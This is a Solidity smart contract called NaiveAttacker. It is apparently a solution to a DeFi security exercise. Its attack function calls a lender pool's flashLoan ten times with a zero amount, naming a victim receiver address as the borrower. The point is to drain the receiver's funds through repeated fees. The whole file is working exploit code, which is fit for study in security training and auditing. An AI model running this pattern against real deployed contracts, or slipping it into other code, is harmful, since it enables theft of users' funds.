// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveAttacker {
    ILenderPool private lenderPool;
    address private receiver;

    constructor(ILenderPool _lenderPool, address _receiver) {
        lenderPool = _lenderPool;
        receiver = _receiver;
    }

    function attack() external {
        uint256 counter = 0;
        while (counter++ < 10) {
            lenderPool.flashLoan(receiver, 0 ether);
        }
    }
}
